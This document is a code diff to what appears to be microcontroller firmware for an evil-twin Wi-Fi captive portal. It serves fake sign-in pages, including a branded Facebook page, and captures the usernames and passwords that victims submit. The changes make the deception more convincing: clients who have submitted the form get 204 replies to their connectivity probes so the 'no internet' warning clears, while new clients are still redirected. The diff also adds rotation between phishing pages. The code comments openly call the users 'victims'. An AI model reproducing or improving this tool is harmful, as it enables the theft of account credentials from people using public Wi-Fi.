@@ -7,28 +7,55 @@
 
 static struct tcp_pcb* web_listen = NULL;
 static void (*web_render)(char*, size_t) = NULL;
+static void (*web_rotate)(void) = NULL;
 static bool web_portal = false;
 
 // Selected captive-portal page, set by web_lwip_start_portal(): the .ino resolves the chosen
 // portal (Default/brand-gzip/Custom) and hands the bytes here. body==NULL falls back to the
 // built-in generic sign-in page below. gzip blobs live in flash (immutable, safe to stream
-// zero-copy); the custom buffer is a mutable global, so it is streamed with COPY so a mid-send
-// PORTALHTML cannot corrupt the in-flight body (lwIP copies into pbufs as we chunk).
+// zero-copy); the custom buffer AND the Default page are mutable, so they are streamed with COPY
+// so a mid-send PORTALHTML cannot corrupt the in-flight body (lwIP copies into pbufs as we chunk).
 static const char* g_portal_body = NULL;
 static int         g_portal_len  = 0;
 static bool        g_portal_gzip = false;
 static bool        g_portal_copy = false;
 
+// Portal URLs, derived by the sketch from the AP SSID (build_portal_urls). The DNS hijack
+// resolves the host to us, so the same host is used by DHCP option 114, the 302 and cp.json.
+static char g_root[64] = "http://192.168.4.1/";
+
+// Per-client captive state: once a client submits the portal form it is "authorized" and we answer
+// ITS OS connectivity probes with 204 (No Content) so the "Connected, no internet" warning clears,
+// and cp.json flips to captive:false. Un-authorized clients still get a 302 to the portal, so the
+// sign-in keeps popping for new victims. Keyed on the peer IPv4 (tpcb->remote_ip).
+static uint32_t g_authed[8];
+static uint8_t  g_authed_n = 0;
+
+static bool ip_authed(uint32_t ip) {
+    for (uint8_t i = 0; i < g_authed_n; i++) if (g_authed[i] == ip) return true;
+    return false;
+}
+
+static void ip_mark_authed(uint32_t ip) {
+    if (!ip || ip_authed(ip)) return;
+    g_authed[g_authed_n % 8] = ip;
+    if (g_authed_n < 8) g_authed_n++;
+}
+
 // Single-slot credential queue: web_recv runs in the tcpip thread and must NOT touch Serial1
 // (two threads on one UART -> corruption; a blocking UART write stalls the stack). So it parks the
 // captured query string here and loop() drains + prints EV: via web_lwip_poll_creds().
 static volatile bool g_creds_ready = false;
-static char g_creds[128];
+static char g_creds[96];
 
 // Per-connection send cursor for the (possibly large, e.g. 39KB facebook) portal body: the body
 // can exceed one tcp_sndbuf, so it is streamed across tcp_sent callbacks. Allocated in web_recv,
-// freed on completion or on tcp_err (a victim that drops mid-send must not leak it).
+// freed on completion, on tcp_err, and on peer FIN (a victim that drops mid-send must not leak it).
 struct web_send { const char* body; int len; int off; u8_t copy; };
+
+// Shared scratch for the WebUI page and the cp.json body (the two never run at the same time:
+// WebUI mode and portal mode are mutually exclusive).
+static char g_body[800];
 
 // Minimal captive-portal sign-in page (flash). Fallback when no portal is selected. The form
 // submits via GET, so the credentials arrive as /login?user=..&pass=.. and are captured from the
@@ -44,12 +71,13 @@ static const char PORTAL_BODY[] =
     "<input name=pass type=password placeholder=Password style='display:block;margin:8px auto;padding:9px;width:220px'>"
     "<button style='padding:9px 28px'>Connect</button></form></body></html>";
 
-static const char CAPTIVE_JSON_RESP[] =
-    "HTTP/1.1 200 OK\r\nContent-Type: application/captive+json\r\nConnection: close\r\n\r\n"
-    "{\"captive\":true,\"user-portal-url\":\"http://192.168.4.1/\"}";
+static const char REDIRECT_HEAD[] =
+    "HTTP/1.1 302 Found\r\nLocation: ";
+static const char REDIRECT_TAIL[] = "\r\nConnection: close\r\n\r\n";
 
-static const char REDIRECT_RESP[] =
-    "HTTP/1.1 302 Found\r\nLocation: http://192.168.4.1/\r\nConnection: close\r\n\r\n";
+static const char NO_CONTENT_RESP[] =
+    "HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nCache-Control: no-store\r\n"
+    "Connection: close\r\n\r\n";
 
 // OS connectivity-probe URLs -> 302 to the portal root, which triggers the sign-in popup.
 static bool is_probe(const char* path) {
@@ -91,7 +119,7 @@ static void web_finish(struct tcp_pcb* tpcb, struct web_send* ws) {
 
 // Queue as much of the remaining body as tcp_sndbuf allows; the tcp_sent callback resumes this
 // when the window drains. When the last byte is queued, close (lwIP flushes queued data before
-// the FIN). Zero-copy for flash gzip blobs; COPY for the mutable custom buffer.
+// the FIN). Zero-copy for flash gzip blobs; COPY for the mutable buffers.
 static err_t web_send_body(struct tcp_pcb* tpcb, struct web_send* ws) {
     while (ws->off < ws->len) {
         u16_t room = tcp_sndbuf(tpcb);
@@ -122,9 +150,23 @@ static void web_err(void* arg, err_t err) {
     if (arg) mem_free(arg);   // peer aborted/reset mid-send: pcb already freed by lwIP, free cursor
 }
 
+// Small single-write response (fits one sndbuf by construction). Returns false if it did not fit.
+static bool web_small(struct tcp_pcb* tpcb, const char* a, const char* b, const char* c) {
+    size_t n = strlen(a) + (b ? strlen(b) : 0) + (c ? strlen(c) : 0);
+    if (tcp_sndbuf(tpcb) < (u16_t)n) return false;
+    tcp_write(tpcb, a, (u16_t)strlen(a), TCP_WRITE_FLAG_COPY);
+    if (b) tcp_write(tpcb, b, (u16_t)strlen(b), TCP_WRITE_FLAG_COPY);
+    if (c) tcp_write(tpcb, c, (u16_t)strlen(c), TCP_WRITE_FLAG_COPY);
+    tcp_output(tpcb);
+    return true;
+}
+
 static err_t web_recv(void* arg, struct tcp_pcb* tpcb, struct pbuf* p, err_t err) {
-    (void)arg; (void)err;
-    if (p == NULL) { tcp_close(tpcb); return ERR_OK; }     // peer closed
+    (void)err;
+    if (p == NULL) {                       // peer closed: free any in-flight cursor, then close
+        web_finish(tpcb, (struct web_send*)arg);
+        return ERR_OK;
+    }
     // copy the request line out of the FIRST pbuf before freeing (most GETs fit one segment)
     char req[200];
     u16_t rl = p->len < (u16_t)(sizeof(req) - 1) ? p->len : (u16_t)(sizeof(req) - 1);
@@ -135,13 +177,12 @@ static err_t web_recv(void* arg, struct tcp_pcb* tpcb, struct pbuf* p, err_t err
     if (!web_portal) {
         // --- WebUI mode: serve the render() status page to any request ---
         if (web_render) {
-            static char body[800];
-            web_render(body, sizeof(body));
-            size_t bl = strlen(body);
+            web_render(g_body, sizeof(g_body));
+            size_t bl = strlen(g_body);
             char hdr[160]; int hl = http_hdr(hdr, bl, false);
             if (tcp_sndbuf(tpcb) >= (u16_t)(hl + (int)bl)) {
                 tcp_write(tpcb, hdr, (u16_t)hl, TCP_WRITE_FLAG_COPY);
-                tcp_write(tpcb, body, (u16_t)bl, TCP_WRITE_FLAG_COPY);
+                tcp_write(tpcb, g_body, (u16_t)bl, TCP_WRITE_FLAG_COPY);
                 tcp_output(tpcb);
             }
         }
@@ -155,24 +196,44 @@ static err_t web_recv(void* arg, struct tcp_pcb* tpcb, struct pbuf* p, err_t err
     if (sp) { path = sp + 1; char* sp2 = strchr(path, ' '); if (sp2) *sp2 = 0; }
     if (!path || !*path) { tcp_close(tpcb); return ERR_OK; }
 
-    // credential capture: a query string with '=' is a form submission -> park it for loop()
+    const uint32_t peer = ip_addr_get_ip4_u32(&tpcb->remote_ip);
+    bool authed = ip_authed(peer);
+
+    // credential capture: a query string with '=' is a form submission -> park it for loop(),
+    // authorize the client, and advance the portal rotation (if enabled).
     char* q = strchr(path, '?');
-    if (q && strchr(q, '=') && !g_creds_ready) {
-        size_t n = strlen(q + 1);
-        if (n > sizeof(g_creds) - 1) n = sizeof(g_creds) - 1;
-        memcpy(g_creds, q + 1, n); g_creds[n] = 0;
-        g_creds_ready = true;              // loop() drains + prints "EV:<query>"
+    if (q && strchr(q, '=')) {
+        if (!g_creds_ready) {
+            size_t n = strlen(q + 1);
+            if (n > sizeof(g_creds) - 1) n = sizeof(g_creds) - 1;
+            memcpy(g_creds, q + 1, n); g_creds[n] = 0;
+            g_creds_ready = true;              // loop() drains + prints "EV:<query>"
+        }
+        ip_mark_authed(peer);
+        authed = true;
+        if (web_rotate) web_rotate();
     }
 
     if (strncmp(path, "/cp.json", 8) == 0) {
-        tcp_write(tpcb, CAPTIVE_JSON_RESP, (u16_t)(sizeof(CAPTIVE_JSON_RESP) - 1), 0);
-        tcp_output(tpcb);
+        char* body = g_body;
+        strcpy(body, "{\"captive\":");
+        strcpy(body + strlen(body), authed ? "false" : "true");
+        strcpy(body + strlen(body), ",\"user-portal-url\":\"");
+        strcpy(body + strlen(body), g_root);
+        strcpy(body + strlen(body), "\"}");
+        if (!web_small(tpcb, "HTTP/1.1 200 OK\r\nContent-Type: application/captive+json\r\n"
+                             "Connection: close\r\n\r\n", body, NULL)) {
+            tcp_close(tpcb); return ERR_OK;
+        }
         tcp_close(tpcb);
         return ERR_OK;
     }
     if (is_probe(path)) {
-        tcp_write(tpcb, REDIRECT_RESP, (u16_t)(sizeof(REDIRECT_RESP) - 1), 0);
-        tcp_output(tpcb);
+        if (authed) {
+            if (!web_small(tpcb, NO_CONTENT_RESP, NULL, NULL)) { tcp_close(tpcb); return ERR_OK; }
+        } else if (!web_small(tpcb, REDIRECT_HEAD, g_root, REDIRECT_TAIL)) {
+            tcp_close(tpcb); return ERR_OK;
+        }
         tcp_close(tpcb);
         return ERR_OK;
     }
@@ -209,6 +270,8 @@ static bool web_listen_start() {
     struct tcp_pcb* pcb = tcp_new();
     if (!pcb) return false;
     if (tcp_bind(pcb, IP_ADDR_ANY, 80) != ERR_OK) { tcp_close(pcb); return false; }
+    // NOTE: on failure tcp_listen() leaves pcb allocated (it only frees it on success), so the
+    // tcp_close() below is correct and NOT a double free.
     web_listen = tcp_listen(pcb);
     if (!web_listen) { tcp_close(pcb); return false; }
     tcp_accept(web_listen, web_accept);
@@ -222,10 +285,25 @@ bool web_lwip_start(void (*render)(char* buf, size_t cap)) {
 
 bool web_lwip_start_portal(const char* body, int len, bool gzip, bool copy) {
     web_render = NULL; web_portal = true; g_creds_ready = false;
+    g_authed_n = 0;
     g_portal_body = (body && len > 0) ? body : NULL;
     g_portal_len  = len; g_portal_gzip = gzip; g_portal_copy = copy;
     return web_listen_start();
 }
+
+void web_lwip_set_portal(const char* body, int len, bool gzip, bool copy) {
+    g_portal_body = (body && len > 0) ? body : NULL;
+    g_portal_len  = len; g_portal_gzip = gzip; g_portal_copy = copy;
+}
+
+void web_lwip_set_urls(const char* root, const char* cpjson) {
+    (void)cpjson;   // the cp.json URL is derived from root at request time
+    if (root && root[0]) {
+        strncpy(g_root, root, sizeof(g_root) - 1); g_root[sizeof(g_root) - 1] = 0;
+    }
+}
+
+void web_lwip_set_rotate(void (*fn)(void)) { web_rotate = fn; }
 
 bool web_lwip_poll_creds(char* buf, int cap) {
     if (!g_creds_ready) return false;
@@ -240,4 +318,5 @@ void web_lwip_stop() {
     if (web_listen) { tcp_close(web_listen); web_listen = NULL; }
     web_portal = false; g_creds_ready = false;
     g_portal_body = NULL; g_portal_len = 0;
+    g_authed_n = 0;
 }
